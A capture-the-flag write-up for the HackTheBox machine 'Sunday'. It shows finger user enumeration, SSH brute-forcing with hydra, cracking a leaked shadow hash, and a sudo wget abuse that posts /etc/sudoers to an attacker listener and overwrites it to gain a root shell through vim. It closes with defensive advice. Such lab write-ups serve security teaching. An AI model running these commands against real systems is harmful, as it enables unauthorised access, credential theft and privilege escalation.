# Sunday

```
kali@kali:~/htb/Sunday$ sudo nmap -sV -sC 10.129.89.207
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 16:29 EST
Nmap scan report for 10.129.89.207
Host is up (0.031s latency).
Not shown: 991 closed ports
PORT      STATE    SERVICE    VERSION
79/tcp    open     finger     Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind    2-4 (RPC #100000)
563/tcp   filtered snews
1166/tcp  filtered qsm-remote
2001/tcp  filtered dc
5000/tcp  filtered upnp
6007/tcp  filtered X11:7
9090/tcp  filtered zeus-admin
10024/tcp filtered unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 246.50 seconds
```

And we got finger on port 79. So I’m using pentestingmonkeys finger enum script, which you can find over at https://github.com/pentestmonkey/finger-user-enum 

I first try the wordlist: /usr/share/wordlists/usernames.txt, but I noticed that it would take way to long, so I switched to a shorter one /opt/seclists/Usernames/Names/names.txt


```
kali@kali:~/htb/Sunday$ sudo /home/kali/finger-user-enum/finger-user-enum.pl -t 10.129.89.207 -U /opt/seclists/Usernames/Names/names.txt
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /opt/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10163
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sat Jan 30 18:33:26 2021 #########
access@10.129.89.207: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.89.207: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
bin@10.129.89.207: bin             ???                         < .  .  .  . >..
dee dee@10.129.89.207: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.129.89.207: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.129.89.207: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.129.89.207: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.129.89.207: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.129.89.207: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
sammy@10.129.89.207: sammy                 console      <Oct 10 18:25>..
sunny@10.129.89.207: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
sys@10.129.89.207: sys             ???                         < .  .  .  . >..
zsa zsa@10.129.89.207: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Sat Jan 30 19:02:13 2021 #########
13 results.

10163 queries in 1727 seconds (5.9 queries / sec)
kali@kali:~/htb/Sunday$
```

So the most interesting user here is sunny, as it seems like the only user that has logged in. with 10.10.14.4.

The issue is that I don’t have a place to enter this information. Maybe I need to do another port scan?

```
kali@kali:~/htb/Sunday$ sudo nmap -p- --max-retries 1 10.129.89.207
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 19:06 EST
Warning: 10.129.89.207 giving up on port because retransmission cap hit (1).
Nmap scan report for sunday.htb (10.129.89.207)
Host is up (0.030s latency).
Not shown: 33183 filtered ports, 32347 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
40743/tcp open  unknown
64222/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 867.94 seconds
kali@kali:~/htb/Sunday$
```

-p- just selects all ports. And --max-retries just ensures that we wont miss out on information just because the service is unstable.

Ok. Let’s see if we can get some more information from those ports.

```
kali@kali:~/htb/Sunday$ sudo nmap -sV -sC -p 22022,40743,64222 10.129.89.207
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 19:23 EST
Nmap scan report for sunday.htb (10.129.89.207)
Host is up (0.030s latency).

PORT      STATE SERVICE VERSION
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
40743/tcp open  unknown
64222/tcp open  unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
kali@kali:~/htb/Sunday$
```

So we have a ssh entrypoint. We don’t have a password, so I’m going to try to brute-force it with hydra:

```
kali@kali:~/htb/Sunday$ sudo hydra -f -vV -I -l sunny -P /usr/share/wordlists/top12k.txt ssh://10.129.89.207 -s 22022 -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-30 19:24:49
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 12646 login tries (l:1/p:12646), ~3162 tries per task
[DATA] attacking ssh://10.129.89.207:22022/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://sunny@10.129.89.207:22022
[INFO] Successful, password authentication is supported by ssh://10.129.89.207:22022
[ATTEMPT] target 10.129.89.207 - login "sunny" - pass "123456" - 1 of 12646 [child 0] (0/0)
[ATTEMPT] target 10.129.89.207 - login "sunny" - pass "password" - 2 of 12646 [child 1] (0/0)
[...]
[...]
[...]
[22022][ssh] host: 10.129.89.207   login: sunny   password: sunday
[STATUS] attack finished for 10.129.89.207 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-30 19:50:40
kali@kali:~/htb/Sunday$

```

-f stops when a match is found

-v prints more verbose informaion, like all combos being tried.

-V prints more verbose information about how hydra is running, Wether the addresses are resolved etc.

-I just makes it so hydra does not restart the previous search. It's useful for making sure hydra runs right. 

-s to select unusual ports

-t selects how many threads to use. 4 is reccommended for ssh.

And we got a hit, almost 30 minutes in. I wonder if there was another way to get the password except just guessing the password from the box name, which I feel is slightly cheap.

```
kali@kali:~/htb/Sunday$ sudo ssh sunny@10.129.89.207 -p 22022
[sudo] password for kali:
Unable to negotiate with 10.129.89.207 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

So I google and find a quick fix:

```
kali@kali:~/htb/Sunday$ sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.129.89.207 -p 22022
The authenticity of host '[10.129.89.207]:22022 ([10.129.89.207]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.89.207]:22022' (RSA) to the list of known hosts.
Password:
Last login: Sun Jan 31 06:21:04 2021 from 10.10.14.69
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$
```

The shell is annoying to use, as it freezes every 5 seconds. 

```
sunny@sunday:/export/home/sammy$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```
Our special permission seems to run a script, that just outputs testing, and an id for root user. However, I am unable to see the script itself, or it’s permissions

```
sunny@sunday:/$ ls
backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr
sunny@sunday:/$ cd backup
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ ls -la
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2020-09-30 13:20 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

I eventually find this. We have the shadow backup for sammy and sunny.

So I make a copy of it, and create a hash file for John the ripper.

```
kali@kali:~/htb/Sunday$ hashid known_hash
--File 'known_hash'--
Analyzing '$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3'
[+] SHA-256 Crypt
--End of file 'known_hash'--kali@kali:~/htb/Sunday$
```

We identify that the hash is SHA-256 crypt.

```
kali@kali:~/htb/Sunday$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)
1g 0:00:00:21 DONE (2021-01-30 20:23) 0.04618g/s 9459p/s 9459c/s 9459C/s domonique1..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~/htb/Sunday$ john --show hash
?:cooldude!

1 password hash cracked, 0 left
kali@kali:~/htb/Sunday$

```
So let’s login

```
sunny@sunday:/backup$ su sammy
Password:
sunny@sunday:/backup$ whoami
Sammy
sunny@sunday:/backup$ id
uid=101(sammy) gid=10(staff) groups=10(staff)
sunny@sunday:/backup$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
sunny@sunday:/backup$
```

This is very good for us. Since wget has some options that allow us to set an output file. This means that we can change any file we wish in the system.

```
sunny@sunday:/export/home/sammy$ which vim
/usr/bin/vim
```

So I see that the system has got vim installed, so I want to try to get a shell out of that, by giving the user sammy permissions to run it as sudo NOPASSWD.

To do this, we can replace the /etc/sudoers file.

Let’s first copy it over to our machine so we can look at it, and change stuff without breaking anything.

I run netcat on port 80, so that we can receive an incoming file from wget.

```
kali@kali:~/htb/Sunday$ sudo nc -nlvp 80
Listening on 0.0.0.0 80
```

And then on the target: 

```
sunny@sunday:/export/home/sammy$ sudo wget --post-file=/etc/sudoers 10.10.14.69
--07:09:18--  http://10.10.14.69/
           => `index.html'
Connecting to 10.10.14.69:80... connected.
HTTP request sent, awaiting response...
```

Fairly self-explanitory syntax.

On our listener:

```
kali@kali:~/htb/Sunday$ sudo nc -nlvp 80
Listening on 0.0.0.0 80
Connection received on 10.129.89.207 55606
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.69
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 795

# sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
# Failure to use 'visudo' may result in syntax or file permission errors
# that prevent sudo from running.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# Host alias specification

# User alias specification

# Cmnd alias specification

# Defaults specification

# Runas alias specification

# User privilege specification
root    ALL=(ALL) ALL

# Uncomment to allow people in group wheel to run all commands
# %wheel        ALL=(ALL) ALL

# Same thing without a password
# %wheel        ALL=(ALL) NOPASSWD: ALL

# Samples
# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
# %users  localhost=/sbin/shutdown -h now
sammy ALL=(root) NOPASSWD: /usr/bin/wget
sunny ALL=(root) NOPASSWD: /root/troll
```

So we can take that, and change the NOPASSWD to 

```
sunny@sunday:/export/home/sammy$ which vim
/usr/bin/vim
```

/usr/bin/vim

So I add that in addition to the wget.

```
sammy ALL=(root) NOPASSWD: /usr/bin/vim
sammy ALL=(root) NOPASSWD: /usr/bin/wget
sunny ALL=(root) NOPASSWD: /root/troll
```

I don’t replace it, as if vim does not function properly, I’m screwed.

```
kali@kali:~/htb/Sunday$ sudo vim new_sudoers
kali@kali:~/htb/Sunday$ sudo python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

And then to download and replace:

```
sunny@sunday:/$ sudo wget -O /etc/sudoers http://10.10.14.69:8000/new_sudoers
--07:22:41--  http://10.10.14.69:8000/new_sudoers
           => `/etc/sudoers'
Connecting to 10.10.14.69:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 841 [application/octet-stream]

100%[===================================================================================================================>] 841           --.--K/s             

07:22:41 (95.70 MB/s) - `/etc/sudoers' saved [841/841]
```

-O file means that all information w-gotten will be truncated to that file. So we are essentially replacing the sudoers file.


And now we can use vim to get a root shell:

```
sunny@sunday:/$ sudo vim /etc/sudoers
```

And while in vim, we type this in the command line:

```
:! /bin/bash
root@sunday:/# whoami
root
root@sunday:/#
```

Note that the better option for sudoers is 
```
sammy ALL=(ALL) NOPASSWD:ALL
```

As it unlocks everything.


## Comparing myself to the official writeup:

They also used the finger enum script to find sammy and sunny. As the usernames. They state that hydra does not work for bruteforcing this box, but I did that. So maybe it was updated? They state other tools are available. Maybe something like patator:  https://github.com/lanjelot/patator 

They decide to rewrite the troll script that sunny has access to with the wget command. And execute it the second it is ran, as it is refreshed every second. 

## How to stop this exploit:

The user enumeration was done with finger. Unless this is necessary for some reason, there is no need for it to be open. Therefore, disabling finger would increase security be reducing enumeration possibilities. A safe password should also be used by the user sunny. And sammy. As both of their passwords are very common and unsafe. In addition, the user sammy should not have sudo privileges for a program as powerful as wget. 
